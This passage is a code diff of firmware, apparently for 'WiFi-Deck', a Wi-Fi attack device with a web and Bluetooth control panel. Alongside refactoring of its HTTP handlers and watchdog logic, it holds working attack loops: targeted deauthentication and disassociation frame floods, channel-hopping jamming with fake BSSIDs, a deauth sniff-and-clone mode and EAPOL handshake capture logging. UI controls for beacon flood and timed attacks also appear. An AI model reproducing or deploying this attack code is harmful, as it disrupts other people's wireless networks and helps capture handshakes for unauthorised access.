             preValid = parseSniffTimeCmd(cmd, dummyDur, dummyMode, errMsg);
           }
           if (!preValid) {
-            String json = "{\"status\":\"error\",\"message\":\"" + jsonEscape(errMsg) + "\"}";
-            sendHttpResponse(client, 400, "application/json", json.c_str(), json.length());
+            char escErr[192], resp[256];
+            jsonEscapeToBuf(errMsg.c_str(), escErr, sizeof(escErr));
+            int rn = snprintf(resp, sizeof(resp), "{\"status\":\"error\",\"message\":\"%s\"}", escErr);
+            sendHttpResponse(client, 400, "application/json", resp, (rn > 0) ? (size_t)rn : 0);
           } else {
             // 先完整发送 HTTP 200 并等待刷出与单次关闭连接，再切入混杂/STA 模式
-            String json = "{\"status\":\"ok\",\"command\":\"" + jsonEscape(cmd) + "\"}";
-            sendHttpResponse(client, 200, "application/json", json.c_str(), json.length());
-            delay(50);
-            client.stop();
+            char escCmd[192], resp[256];
+            jsonEscapeToBuf(cmd.c_str(), escCmd, sizeof(escCmd));
+            int rn = snprintf(resp, sizeof(resp), "{\"status\":\"ok\",\"command\":\"%s\"}", escCmd);
+            bool sentOk = sendHttpResponse(client, 200, "application/json", resp, (rn > 0) ? (size_t)rn : 0);
+            closeWebClient(client, sentOk);
+            delay(35);
             clientClosed = true;
             executeCommand(cmd, &errMsg, true);
             // If no BLE client is connected, protect pure-WebUI users with an automatic 15s recovery timer
@@ -3538,7 +4887,7 @@ void handleWebClient() {
             rtw_enter_critical(NULL, NULL);
             sniffStarted = isSniffing;
             rtw_exit_critical(NULL, NULL);
-            if (sniffStarted && !BLE.connected(activeConnId) && !timedSniffEnabled) {
+            if (sniffStarted && !isBleConnectedSafe() && !timedSniffEnabled) {
               timedSniffEnabled = true;
               sniffStartTime = millis();
               sniffDuration = 15000;
@@ -3547,12 +4896,16 @@ void handleWebClient() {
         } else {
           String errMsg;
           if (executeCommand(cmd, &errMsg, true)) {
-            String json = "{\"status\":\"ok\",\"command\":\"" + jsonEscape(cmd) + "\"}";
-            sendHttpResponse(client, 200, "application/json", json.c_str(), json.length());
+            char escCmd[192], resp[256];
+            jsonEscapeToBuf(cmd.c_str(), escCmd, sizeof(escCmd));
+            int rn = snprintf(resp, sizeof(resp), "{\"status\":\"ok\",\"command\":\"%s\"}", escCmd);
+            sendHttpResponse(client, 200, "application/json", resp, (rn > 0) ? (size_t)rn : 0);
           } else {
             int statusCode = (cmd.equalsIgnoreCase("scan")) ? 500 : 400;
-            String json = "{\"status\":\"error\",\"message\":\"" + jsonEscape(errMsg.length() ? errMsg : String("Command failed")) + "\"}";
-            sendHttpResponse(client, statusCode, "application/json", json.c_str(), json.length());
+            char escErr[192], resp[256];
+            jsonEscapeToBuf(errMsg.length() ? errMsg.c_str() : "Command failed", escErr, sizeof(escErr));
+            int rn = snprintf(resp, sizeof(resp), "{\"status\":\"error\",\"message\":\"%s\"}", escErr);
+            sendHttpResponse(client, statusCode, "application/json", resp, (rn > 0) ? (size_t)rn : 0);
           }
         }
       }
@@ -3560,13 +4913,12 @@ void handleWebClient() {
   }
   else if (path == "/api/target") {
     if (method != "POST") {
-      String json = "{\"status\":\"error\",\"message\":\"Method Not Allowed\"}";
-      sendHttpResponse(client, 405, "application/json", json.c_str(), json.length());
+      sendHttpResponse(client, 405, "application/json", ERR_405, sizeof(ERR_405) - 1);
     } else {
       bool hasIndices = hasFormKey(body, "indices") || hasFormKey(queryStr, "indices");
       if (!hasIndices) {
-        String json = "{\"status\":\"error\",\"message\":\"Missing 'indices' parameter\"}";
-        sendHttpResponse(client, 400, "application/json", json.c_str(), json.length());
+        static const char ERR_IDX[] = "{\"status\":\"error\",\"message\":\"Missing 'indices' parameter\"}";
+        sendHttpResponse(client, 400, "application/json", ERR_IDX, sizeof(ERR_IDX) - 1);
       } else {
         String indices = hasFormKey(body, "indices") ? getPostValue(body, "indices") : getQueryParam(fullPath, "indices");
         indices.trim();
@@ -3577,23 +4929,26 @@ void handleWebClient() {
         bool targetModeSnap = false;
         getScanAndTargetCountsSafe(scanCount, targetCount, targetModeSnap);
         if (!ok) {
-          String json = "{\"status\":\"error\",\"message\":\"" + jsonEscape(errMsg) +
-                        "\",\"targets\":" + String(targetCount) +
-                        ",\"target_mode\":" + String(targetModeSnap ? "true" : "false") + "}";
-          sendHttpResponse(client, 400, "application/json", json.c_str(), json.length());
+          char escErr[192], resp[280];
+          jsonEscapeToBuf(errMsg.c_str(), escErr, sizeof(escErr));
+          int rn = snprintf(resp, sizeof(resp),
+                            "{\"status\":\"error\",\"message\":\"%s\",\"targets\":%lu,\"target_mode\":%s}",
+                            escErr, (unsigned long)targetCount, targetModeSnap ? "true" : "false");
+          sendHttpResponse(client, 400, "application/json", resp, (rn > 0) ? (size_t)rn : 0);
         } else {
           blePushStatus();
-          String json = "{\"status\":\"ok\",\"targets\":" + String(targetCount) +
-                        ",\"target_mode\":" + String(targetModeSnap ? "true" : "false") + "}";
-          sendHttpResponse(client, 200, "application/json", json.c_str(), json.length());
+          char resp[96];
+          int rn = snprintf(resp, sizeof(resp),
+                            "{\"status\":\"ok\",\"targets\":%lu,\"target_mode\":%s}",
+                            (unsigned long)targetCount, targetModeSnap ? "true" : "false");
+          sendHttpResponse(client, 200, "application/json", resp, (rn > 0) ? (size_t)rn : 0);
         }
       }
     }
   }
   else if (path == "/api/config") {
     if (method != "POST") {
-      String json = "{\"status\":\"error\",\"message\":\"Method Not Allowed\"}";
-      sendHttpResponse(client, 405, "application/json", json.c_str(), json.length());
+      sendHttpResponse(client, 405, "application/json", ERR_405, sizeof(ERR_405) - 1);
     } else {
       static const char* const cfgKeys[] = {
         "ap_ssid", "ap_pass", "ble_name", "cycle_delay", "scan_time",
@@ -3615,11 +4970,13 @@ void handleWebClient() {
         }
       }
       if (!hasAnyKey) {
-        String json = "{\"status\":\"error\",\"message\":\"No valid configuration parameters provided\"}";
-        sendHttpResponse(client, 400, "application/json", json.c_str(), json.length());
+        static const char ERR_NO_CFG[] = "{\"status\":\"error\",\"message\":\"No valid configuration parameters provided\"}";
+        sendHttpResponse(client, 400, "application/json", ERR_NO_CFG, sizeof(ERR_NO_CFG) - 1);
       } else if (!valid) {
-        String json = "{\"status\":\"error\",\"message\":\"" + jsonEscape(errMsg) + "\"}";
-        sendHttpResponse(client, 400, "application/json", json.c_str(), json.length());
+        char escErr[192], resp[256];
+        jsonEscapeToBuf(errMsg.c_str(), escErr, sizeof(escErr));
+        int rn = snprintf(resp, sizeof(resp), "{\"status\":\"error\",\"message\":\"%s\"}", escErr);
+        sendHttpResponse(client, 400, "application/json", resp, (rn > 0) ? (size_t)rn : 0);
       } else {
         String result = "";
         bool apChanged = false;
@@ -3641,9 +4998,12 @@ void handleWebClient() {
             scheduleApRestart();
           }
         }
-        String json = "{\"status\":\"ok\",\"ap_restarted\":" + String(pendingApRestart ? "true" : "false") +
-                      ",\"message\":\"" + jsonEscape(result) + "\"}";
-        sendHttpResponse(client, 200, "application/json", json.c_str(), json.length());
+        char escRes[192], resp[280];
+        jsonEscapeToBuf(result.c_str(), escRes, sizeof(escRes));
+        int rn = snprintf(resp, sizeof(resp),
+                          "{\"status\":\"ok\",\"ap_restarted\":%s,\"message\":\"%s\"}",
+                          pendingApRestart ? "true" : "false", escRes);
+        sendHttpResponse(client, 200, "application/json", resp, (rn > 0) ? (size_t)rn : 0);
       }
     }
   }
@@ -3651,18 +5011,16 @@ void handleWebClient() {
     if (method == "GET") {
       sendHttpResponse(client, 200, "text/html", INDEX_HTML, strlen(INDEX_HTML));
     } else {
-      String json = "{\"status\":\"error\",\"message\":\"Method Not Allowed\"}";
-      sendHttpResponse(client, 405, "application/json", json.c_str(), json.length());
+      sendHttpResponse(client, 405, "application/json", ERR_405, sizeof(ERR_405) - 1);
     }
   }
   else {
-    String msg = "404 Not Found";
-    sendHttpResponse(client, 404, "text/plain", msg.c_str(), msg.length());
+    static const char ERR_404[] = "404 Not Found";
+    sendHttpResponse(client, 404, "text/plain", ERR_404, sizeof(ERR_404) - 1);
   }
 
   if (!clientClosed) {
-    delay(10);
-    client.stop();
+    closeWebClient(client, true);
   }
   if (USE_LED) digitalWrite(LED_G, LOW);
 }
@@ -3785,7 +5143,7 @@ body{background:#0d1117;color:#f0f6fc;font-family:-apple-system,BlinkMacSystemFo
     <div class="chip" onclick="selectAllVisible()">全选</div>
     <div class="chip" onclick="clearSelection()">清空</div>
   </div>
-  <div class="loading" id="scanLoading">正在扫描 2.4GHz & 5GHz 频段... (约5秒)</div>
+  <div class="loading" id="scanLoading">正在扫描 2.4GHz & 5GHz 频段...</div>
   <div id="netList"></div>
 </div>
 
@@ -3868,9 +5226,9 @@ body{background:#0d1117;color:#f0f6fc;font-family:-apple-system,BlinkMacSystemFo
 <script>
 const API='/api';
 let selectedIndices=new Set(),scanCache=null,bandFilter='ALL',sortMode='RSSI',cachedLogs=[];
-let curAtkState={deauth:false,disassoc:false,clone:false,hopping:false,targetMode:false};
+let curAtkState={deauth:false,disassoc:false,clone:false,hopping:false,targetMode:false,bleConnected:false};
 let selectionDirty=false,lastServerScanCount=-1,lastServerTargetCount=-1;
-let statsInFlight=false,logsInFlight=false,reconnectingAP=false,reconnectTimer=null,confirmResolver=null;
+let statsInFlight=false,logsInFlight=false,reconnectingAP=false,reconnectTimer=null,reconnectSeq=0,confirmResolver=null;
 function showPage(p){
   document.querySelectorAll('.tab').forEach((t,i)=>t.classList.toggle('active',['scan','attack','sniff','config'][i]===p));
   document.querySelectorAll('.page').forEach(pg=>pg.classList.remove('active'));
@@ -3925,21 +5283,25 @@ async function syncScanFromServer(){
 }
 async function doScan(){
   if(reconnectingAP){toast('热点恢复中，请稍候...');return;}
-  document.getElementById('scanLoading').classList.add('show');
+  let rawScan=Number(document.getElementById('cfgScanTime').value);
+  let scanMs=(Number.isFinite(rawScan)&&rawScan>=500)?rawScan:5000;
+  let scanSec=Number((scanMs/1000).toFixed(1));
+  let scanLoadEl=document.getElementById('scanLoading');
+  scanLoadEl.textContent=`正在扫描 2.4GHz & 5GHz 频段... (约 ${scanSec} 秒)`;
+  scanLoadEl.classList.add('show');
   document.getElementById('netList').innerHTML='';
   selectedIndices.clear();
   selectionDirty=false;
-  let scanMs=Number(document.getElementById('cfgScanTime').value)||5000;
   let timeoutMs=Math.max(10000,scanMs+5000);
   let res=await fetchAPI(API+'/scan',{method:'POST'},timeoutMs);
   if(!res.ok){
     toast('扫描失败: '+((res.data&&res.data.message)||('HTTP '+res.status)));
-    document.getElementById('scanLoading').classList.remove('show');
+    scanLoadEl.classList.remove('show');
     return;
   }
   await syncScanFromServer();
   if(scanCache)toast('扫描完成: '+scanCache.count+' 个网络');
-  document.getElementById('scanLoading').classList.remove('show');
+  scanLoadEl.classList.remove('show');
   updateAttackStats();
 }
 function setBand(b){
@@ -4024,7 +5386,7 @@ async function startAttack(cmd){
 }
 async function singleApAttack(){
   if(selectedIndices.size===0){toast('请先在扫描页选择一个目标');return;}
-  let firstIdx=Array.from(selectedIndices)[0];
+  let firstIdx=Array.from(selectedIndices).sort((a,b)=>a-b)[0];
   await sendCmd('single_ap '+firstIdx);
 }
 async function timedAttackPreset(ms){
@@ -4054,10 +5416,12 @@ function setReconnectBanners(msg){
 }
 function startReconnectCountdown(seconds,onRecovered){
   if(reconnectTimer){clearInterval(reconnectTimer);reconnectTimer=null;}
+  let mySeq=++reconnectSeq;
   reconnectingAP=true;
   let rem=seconds;
   setReconnectBanners(`⏳ 热点已暂停用于混杂模式，约 ${rem} 秒后自动恢复并回读数据...`);
   reconnectTimer=setInterval(async()=>{
+    if(mySeq!==reconnectSeq){clearInterval(reconnectTimer);reconnectTimer=null;return;}
     if(rem>0){
       rem--;
       setReconnectBanners(rem>0?`⏳ 热点已暂停用于混杂模式，约 ${rem} 秒后自动恢复...`:'🔄 正在重连热点并回读数据...');
@@ -4065,7 +5429,9 @@ function startReconnectCountdown(seconds,onRecovered){
     }
     clearInterval(reconnectTimer);reconnectTimer=null;
     for(let attempt=0;attempt<12;attempt++){
+      if(mySeq!==reconnectSeq)return;
       let st=await fetchAPI(API+'/status',{},2000);
+      if(mySeq!==reconnectSeq)return;
       if(st.ok&&st.data&&!st.data.sniffing){
         reconnectingAP=false;
         setReconnectBanners('');
@@ -4076,9 +5442,29 @@ function startReconnectCountdown(seconds,onRecovered){
       setReconnectBanners(`🔄 等待手机重新连回热点并恢复通信 (${attempt+1}/12)...`);
       await new Promise(r=>setTimeout(r,1500));
     }
+    if(mySeq!==reconnectSeq)return;
     reconnectingAP=false;
     setReconnectBanners('⚠️ 自动重连超时，请确认手机已重新连上设备热点后刷新页面。');
   },1000);
+}
+async function startBleWaitRecovery(onRecovered){
+  if(reconnectTimer){clearInterval(reconnectTimer);reconnectTimer=null;}
+  let mySeq=++reconnectSeq;
+  reconnectingAP=true;
+  setReconnectBanners('⏳ 当前已连蓝牙 App，热点已暂停，请在 App 内停止后自动恢复...');
+  await new Promise(r=>setTimeout(r,1500));
+  while(reconnectingAP&&mySeq===reconnectSeq){
+    let st=await fetchAPI(API+'/status',{},1800);
+    if(mySeq!==reconnectSeq)return;
+    if(st.ok&&st.data&&!st.data.sniffing&&!st.data.deauth_sniff){
+      reconnectingAP=false;
+      setReconnectBanners('');
+      toast('热点已重连');
+      if(onRecovered)await onRecovered();
+      return;
+    }
+    await new Promise(r=>setTimeout(r,2000));
+  }
 }
 async function startWebSniff(mode){
   if(reconnectingAP){toast('热点恢复中，请稍候...');return;}
@@ -4096,15 +5482,28 @@ async function startWebSniff(mode){
 async function startSniffClone(){
   if(curAtkState.clone){await sendCmd('stop');return;}
   if(reconnectingAP){toast('热点恢复中，请稍候...');return;}
-  let confirmed=await showConfirm('嗅探克隆提示','启用 Deauth 嗅探克隆将暂停设备热点并进入混杂监听。未连接蓝牙控制端时约 15 秒后自动恢复热点；如已连接蓝牙 App 可在 App 内随时停止。是否继续？');
+  let st=await fetchJSON(API+'/status',{},1500);
+  let bleConn=st?!!st.ble_connected:!!curAtkState.bleConnected;
+  if(st)curAtkState.bleConnected=bleConn;
+  let confirmMsg=bleConn
+    ?'当前已连蓝牙 App，启用后热点将暂停并持续监听，请在 App 内停止后自动恢复。是否继续？'
+    :'启用 Deauth 嗅探克隆将暂停设备热点并进入混杂监听。未连接蓝牙控制端时约 15 秒后自动恢复热点；如已连接蓝牙 App 可在 App 内随时停止。是否继续？';
+  let confirmed=await showConfirm('嗅探克隆提示',confirmMsg);
   if(!confirmed)return;
+  let stAfter=await fetchJSON(API+'/status',{},1000);
+  if(stAfter){bleConn=!!stAfter.ble_connected;curAtkState.bleConnected=bleConn;}
   let res=await fetchAPI(API+'/command',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'cmd=deauth_sniff'},3500);
   if(!res.ok){
     toast('启动失败: '+((res.data&&res.data.message)||('HTTP '+res.status)));
     return;
   }
-  toast('Deauth 嗅探克隆已启动，热点将在恢复后重连');
-  startReconnectCountdown(15,async()=>{await updateAttackStats();});
+  if(bleConn){
+    toast('当前已连蓝牙 App，热点已暂停，请在 App 内停止后自动恢复');
+    startBleWaitRecovery(async()=>{await updateAttackStats();});
+  }else{
+    toast('Deauth 嗅探克隆已启动，热点将在恢复后重连');
+    startReconnectCountdown(15,async()=>{await updateAttackStats();});
+  }
 }
 async function fetchLogs(){
   if(logsInFlight||reconnectingAP)return;
@@ -4179,6 +5578,7 @@ async function updateAttackStats(){
       curAtkState.clone=!!d.deauth_sniff;
       curAtkState.hopping=!!d.hopping;
       curAtkState.targetMode=!!d.target_mode;
+      curAtkState.bleConnected=!!d.ble_connected;
       document.getElementById('btnDeauth').classList.toggle('running',curAtkState.deauth);
       document.getElementById('btnDisassoc').classList.toggle('running',curAtkState.disassoc);
       document.getElementById('btnBcn').classList.toggle('running',!!d.beacon_flood);
@@ -4312,12 +5712,30 @@ window.onload=()=>{
 //==========================================================
 void setup() {
   Serial.begin(115200);
+
+  uint32_t bootReason = BOOT_Reason();
+  char bootMsg[160];
+  snprintf(bootMsg, sizeof(bootMsg),
+           "[BOOT] ResetReason=0x%08lX (WDG=%d KM4WDG=%d SYS=%d KM4SYS=%d BOD=%d DSLP=%d) FreeHeap=%luB",
+           (unsigned long)bootReason,
+           (bootReason & BIT_BOOT_WDG_RESET_HAPPEN) ? 1 : 0,
+           (bootReason & BIT_BOOT_KM4WDG_RESET_HAPPEN) ? 1 : 0,
+           (bootReason & BIT_BOOT_SYS_RESET_HAPPEN) ? 1 : 0,
+           (bootReason & BIT_BOOT_KM4SYS_RESET_HAPPEN) ? 1 : 0,
+           (bootReason & BIT_BOOT_BOD_RESET_HAPPEN) ? 1 : 0,
+           (bootReason & BIT_BOOT_DSLP_RESET_HAPPEN) ? 1 : 0,
+           (unsigned long)xPortGetFreeHeapSize());
+  Serial.println(bootMsg);
+
+  wdt_enable(8000);
+
   scanMutex = xSemaphoreCreateMutex();
   if (scanMutex == NULL) {
     Serial.println("[ERROR] Failed to create scanMutex!");
   }
 
   loadConfigFromFlash();
+  feedWatchdog();
 
   pinMode(LED_R, OUTPUT);
   pinMode(LED_G, OUTPUT);
@@ -4327,19 +5745,27 @@ void setup() {
     digitalWrite(LED_G, HIGH); delay(100); digitalWrite(LED_G, LOW);
     digitalWrite(LED_B, HIGH); delay(100); digitalWrite(LED_B, LOW);
   }
+  feedWatchdog();
 
   Serial.println("=== WiFi-Deck ===");
   Serial.println("[INFO] Starting WiFi AP (non-hidden)...");
 
   // Start AP in non-hidden mode so phones can discover it
-  startSoftAP();
+  bool apReady = startSoftAP();
+  feedWatchdog();
 
-  Serial.println("[INFO] AP started: " + String(ap_ssid));
-  Serial.println("[INFO] Connect to this WiFi and open 192.168.1.1");
-  Serial.println("[INFO] Web server started on port 80");
+  if (apReady) {
+    Serial.print("[INFO] AP started: ");
+    Serial.println(ap_ssid);
+    Serial.println("[INFO] Connect to this WiFi and open 192.168.1.1");
+    Serial.println("[INFO] Web server started on port 80");
+  } else {
+    Serial.println("[ERROR] Initial SoftAP / WebServer startup failed (self-heal armed).");
+  }
 
   // Start BLE UART service for the Android App
   setupBLE();
+  feedWatchdog();
 
   last_cycle = millis();
 }
@@ -4348,11 +5774,24 @@ void setup() {
 // Main Loop
 //==========================================================
 void loop() {
+  feedWatchdog();
+
   // BLE 异常掉线复位：连接断开后若未收到 CCCD 取消订阅回调，bleNotifyEnabled 会残留为 true，
   // 导致对不存在的连接反复 notify
-  if (bleNotifyEnabled && !BLE.connected(activeConnId)) {
-    bleNotifyEnabled = false;
+  uint8_t bleConnSnap = 0;
+  bool bleNotifySnap = false;
+  getBleStateSafe(bleConnSnap, bleNotifySnap);
+  if (bleNotifySnap && !BLE.connected(bleConnSnap)) {
+    rtw_enter_critical(NULL, NULL);
+    if (activeConnId == bleConnSnap) {
+      bleNotifyEnabled = false;
+    }
+    rtw_exit_critical(NULL, NULL);
+    resetBleLogFlowControl();
   }
+
+  processBleDiagAndNegotiation();
+  ensureBleAdvertisingIfDisconnected();
 
   // 优先响应来自任意通道的急停标志，避免旧排队指令阻塞停机
   consumePriorityStopIfPending();
@@ -4426,6 +5865,9 @@ void loop() {
     }
   }
 
+  // Pump non-blocking BLE scan/sync stream under 2A TX credit flow control
+  pumpBleScanPush();
+
   // Handle web clients (throttled to 25ms to reduce lwIP non-blocking accept overhead)
   static unsigned long lastWebPoll = 0;
   if (millis() - lastWebPoll >= 25) {
@@ -4442,17 +5884,30 @@ void loop() {
     rtw_exit_critical(NULL, NULL);
     if (apEnabled && !sniffActive) {
       stopAllActiveAttacks();
-      startSoftAP();
+      if (startSoftAP()) {
+        Serial.print("[INFO] SoftAP restarted with new credentials: ");
+        Serial.println(ap_ssid);
+      } else {
+        Serial.println("[ERROR] SoftAP restart with new credentials failed!");
+      }
       blePushStatus();
-      Serial.println("[INFO] SoftAP restarted with new credentials: " + String(ap_ssid));
     }
   }
 
   // Timed Attack check
   checkTimedAttack();
 
-  // Attack cycles
-  if (millis() - last_cycle > cycle_delay) {
+  // Attack cycles (3-OptA: non-blocking sliced TX across loop() ticks)
+  if (deauthSlice.active) {
+    if (!attack_enabled || emergencyStopRequested) {
+      deauthSlice.reset();
+      restoreDefaultChannelIfNeeded(false);
+      if (USE_LED) digitalWrite(LED_B, LOW);
+    } else if (!stepSlicedTxCycle(deauthSlice, true, true, 8)) {
+      last_cycle = millis();
+      checkTimedAttack();
+    }
+  } else if (millis() - last_cycle > cycle_delay) {
     if (attack_enabled && !emergencyStopRequested) {
       if (scan_between_cycles) {
         Serial.println("[INFO] Starting scan between attack cycles...");
@@ -4461,25 +5916,53 @@ void loop() {
         }
       }
       if (!shouldAbortCycle() && attack_enabled) {
-        if (hasSelectedTargetsSafe()) {
-          targetAttack();
+        std::vector<WiFiScanResult> targets;
+        bool isTargetMode = false;
+        if (lockScanMutex()) {
+          isTargetMode = target_mode;
+          if (isTargetMode) {
+            targets = target_aps;
+          }
+          unlockScanMutex();
+        }
+        if (isTargetMode && !targets.empty()) {
+          deauthSlice.reset();
+          deauthSlice.targets = targets;
+          deauthSlice.active = true;
+          if (USE_LED) digitalWrite(LED_B, HIGH);
+          if (!stepSlicedTxCycle(deauthSlice, true, true, 8)) {
+            last_cycle = millis();
+            checkTimedAttack();
+          }
         } else {
           // 决策 A：无已选目标时停止攻击而非回退全量攻击
           attack_enabled = false;
           timedAttackEnabled = false;
           blePushStatus();
           Serial.println("[WARN] Deauth attack stopped: no selected targets.");
+          last_cycle = millis();
         }
+      } else {
+        checkTimedAttack();
+        last_cycle = millis();
       }
-      checkTimedAttack();
+    } else {
+      last_cycle = millis();
     }
-    last_cycle = millis();
   }
 
   //===============================
-  // CONTINUOUS DISASSOC ATTACK
+  // CONTINUOUS DISASSOC ATTACK (3-OptA: non-blocking sliced TX)
   //===============================
-  if (disassoc_enabled && !emergencyStopRequested && (millis() - last_disassoc_attack >= disassoc_interval)) {
+  if (disassocSlice.active) {
+    if (!disassoc_enabled || emergencyStopRequested) {
+      disassocSlice.reset();
+      restoreDefaultChannelIfNeeded(false);
+      if (USE_LED) digitalWrite(LED_B, LOW);
+    } else if (!stepSlicedTxCycle(disassocSlice, false, true, 8)) {
+      Serial.println("[DISASSOC] Attack cycle completed.");
+    }
+  } else if (disassoc_enabled && !emergencyStopRequested && (millis() - last_disassoc_attack >= disassoc_interval)) {
     last_disassoc_attack = millis();
 
     std::vector<WiFiScanResult> aps_to_attack = snapshotDisassocTargets();
@@ -4492,35 +5975,13 @@ void loop() {
       blePushStatus();
       Serial.println("[WARN] Disassoc stopped: no selected targets.");
     } else {
+      disassocSlice.reset();
+      disassocSlice.targets = aps_to_attack;
+      disassocSlice.active = true;
       if (USE_LED) digitalWrite(LED_B, HIGH);
-      bool aborted = false;
-      for (size_t i = 0; i < aps_to_attack.size(); i++) {
-        if (shouldAbortCycle() || !disassoc_enabled) {
-          aborted = true;
-          break;
-        }
-        if (wifi_set_channel(aps_to_attack[i].channel) != RTW_SUCCESS) {
-          Serial.print("[WARN] wifi_set_channel(");
-          Serial.print(aps_to_attack[i].channel);
-          Serial.println(") failed");
-          continue;
-        }
-        setCurrentChannelSafe((int)aps_to_attack[i].channel);
-        for (unsigned long j = 0; j < num_send_frames; j++) {
-          if (shouldAbortCycle() || !disassoc_enabled) {
-            aborted = true;
-            break;
-          }
-          uint16_t reason = disassoc_reasons[j % num_disassoc_reasons];
-          // 仅发 AP -> Broadcast 的有效帧
-          wifi_tx_disassoc_frame(aps_to_attack[i].bssid, dst_mac, reason);
-          delay(1);
-        }
-        if (aborted) break;
+      if (!stepSlicedTxCycle(disassocSlice, false, true, 8)) {
+        Serial.println("[DISASSOC] Attack cycle completed.");
       }
-      restoreDefaultChannelIfNeeded(false);
-      if (USE_LED) digitalWrite(LED_B, LOW);
-      Serial.println("[DISASSOC] Attack cycle completed.");
     }
   }
 
@@ -4569,6 +6030,7 @@ void loop() {
   //===============================
   if (signal_jam_enabled && !emergencyStopRequested && (millis() - last_signal_jam >= signal_jam_hop_delay)) {
     last_signal_jam = millis();
+    feedWatchdog();
     // 合并轮询 2.4G + 5G 全信道，仅在切频成功时更新 currentChannel，并在 SoftAP 开启时及时回切 CH 1
     static const int num2G = sizeof(CHANNELS_2GHZ) / sizeof(CHANNELS_2GHZ[0]);
     static const int num5G = sizeof(CHANNELS_5GHZ) / sizeof(CHANNELS_5GHZ[0]);
@@ -4590,7 +6052,7 @@ void loop() {
         wifi_tx_deauth_frame(fakeBSSID, dst_mac, deauth_reasons[j % num_deauth_reasons]);
       }
       signal_jam_count++;
-      if (apEnabled || softApActive) {
+      if ((apEnabled || softApActive) && targetCh != WIFI_CHANNEL) {
         if (wifi_set_channel(WIFI_CHANNEL) == RTW_SUCCESS) {
           setCurrentChannelSafe(WIFI_CHANNEL);
         }
@@ -4632,6 +6094,9 @@ void loop() {
 
     // Pause promisc callback briefly to TX cloned frame cleanly, without toggling UI isSniffing state
     wifi_set_promisc(RTW_PROMISC_DISABLE, NULL, 0);
+    if (promiscCallbackInFlight > 0) {
+      waitForPromiscCallbacksIdle();
+    }
     bool switched = false;
     bool chReady = (targetCh == prevCh);
     if (!chReady && wifi_set_channel(targetCh) == RTW_SUCCESS) {
@@ -4667,42 +6132,105 @@ void loop() {
     hopChannel();
   }
 
-  // Drain sniff logs safely in main loop (print to UART & push to BLE at ~15ms intervals)
+  // Drain sniff logs safely in main loop:
+  // - UART capped at <=25 lines/s (>=40ms interval) to prevent 115200 TX FIFO stalls under bursts.
+  // - BLE sniff stream uses priority bypass (EAPOL/Deauth/Disassoc/Pwnagotchi) + adaptive backpressure
+  //   (100ms..800ms, MTU-aware, credit headroom >=3) so Packet Stream stays populated without starving
+  //   the 1s status heartbeat or LL supervision (disc_cause=0x0108).
   static unsigned long lastLogPush = 0;
   static unsigned long lastDropWarnMs = 0;
-  if (millis() - lastLogPush >= 15) {
+  unsigned long nowLoopMs = millis();
+  if (nowLoopMs - lastLogPush >= 40) {
     char logItem[LOG_STR_LEN];
     bool hasLog = false;
     uint32_t dropped = 0;
     rtw_enter_critical(NULL, NULL);
     if (logTail != logHead) {
-      strncpy(logItem, sniffLogRing[logTail], sizeof(logItem) - 1);
+      size_t cp = strlen(sniffLogRing[logTail]) + 1;
+      if (cp > sizeof(logItem)) cp = sizeof(logItem);
+      memcpy(logItem, sniffLogRing[logTail], cp);
       logItem[sizeof(logItem) - 1] = '\0';
       logTail = (logTail + 1) % LOG_RING_SIZE;
       hasLog = true;
     }
-    if (droppedLogCount > 0 && (millis() - lastDropWarnMs >= 2000)) {
+    if (droppedLogCount > 0 && (nowLoopMs - lastDropWarnMs >= 2000)) {
       dropped = droppedLogCount;
       droppedLogCount = 0;
-      lastDropWarnMs = millis();
+      lastDropWarnMs = nowLoopMs;
     }
     rtw_exit_critical(NULL, NULL);
     if (hasLog) {
-      lastLogPush = millis();
+      lastLogPush = nowLoopMs;
       Serial.println(logItem);
-      bleSendLog(String(logItem));
+
+      uint8_t logConnId = 0;
+      if (!bleScanPush.active && isBleReadyToNotifySafe(logConnId)) {
+        bool isPriority = (strncmp(logItem, "[DATA] EAPOL", 12) == 0 ||
+                           strncmp(logItem, "[MGMT] Deauth", 13) == 0 ||
+                           strncmp(logItem, "[MGMT] Disassoc", 15) == 0 ||
+                           strstr(logItem, "Pwnagotchi") != nullptr);
+        if (isPriority) {
+          if (lastBlePriorityLogMs == 0 || (nowLoopMs - lastBlePriorityLogMs >= 15)) {
+            lastBlePriorityLogMs = nowLoopMs;
+            if (!bleSendSniffLog((const char *)logItem, true)) {
+              rtw_enter_critical(NULL, NULL);
+              bleDroppedLogCount++;
+              rtw_exit_critical(NULL, NULL);
+            }
+          }
+        } else {
+          uint16_t mtuSnap = getEffectiveBleAttMtu(logConnId);
+          unsigned long baseIntervalMs = (mtuSnap < 80) ? BLE_SNIFF_LOW_MTU_INTERVAL_MS : BLE_SNIFF_BASE_INTERVAL_MS;
+          unsigned long curBackoffMs = (bleLogBackoffMs < baseIntervalMs) ? baseIntervalMs : bleLogBackoffMs;
+          if (lastBleRoutineLogMs == 0 || (nowLoopMs - lastBleRoutineLogMs >= curBackoffMs)) {
+            lastBleRoutineLogMs = nowLoopMs;
+            if (bleSendSniffLog((const char *)logItem, false)) {
+              if (curBackoffMs > baseIntervalMs) {
+                unsigned long excess = curBackoffMs - baseIntervalMs;
+                bleLogBackoffMs = baseIntervalMs + ((excess > 50UL) ? (excess - 50UL) : 0UL);
+              } else {
+                bleLogBackoffMs = baseIntervalMs;
+              }
+            } else {
+              unsigned long doubled = curBackoffMs * 2UL;
+              bleLogBackoffMs = (doubled <= BLE_SNIFF_MAX_BACKOFF_MS) ? doubled : BLE_SNIFF_MAX_BACKOFF_MS;
+              rtw_enter_critical(NULL, NULL);
+              bleDroppedLogCount++;
+              rtw_exit_critical(NULL, NULL);
+            }
+          }
+        }
+      }
     }
     if (dropped > 0) {
-      String warnMsg = "[WARN] Sniff log ring dropped " + String(dropped) + " overflow frames";
-      Serial.println(warnMsg);
-      bleSendLog(warnMsg);
+      char warnBuf[80];
+      snprintf(warnBuf, sizeof(warnBuf), "[WARN] Sniff log ring dropped %lu overflow frames", (unsigned long)dropped);
+      Serial.println(warnBuf);
     }
   }
 
-  // Push status heartbeat every 1s
+  // Push status heartbeat every 1s (non-critical per 2A congestion control)
   static unsigned long lastStatusPush = 0;
   if (millis() - lastStatusPush >= 1000) {
     lastStatusPush = millis();
-    blePushStatus();
+    blePushStatus(false);
+  }
+
+  // Periodic FreeHeap diagnostics every 30s (4A)
+  static unsigned long lastHeapDiagMs = 0;
+  unsigned long nowDiagMs = millis();
+  if (nowDiagMs - lastHeapDiagMs >= 30000) {
+    lastHeapDiagMs = nowDiagMs;
+    size_t freeHeap = xPortGetFreeHeapSize();
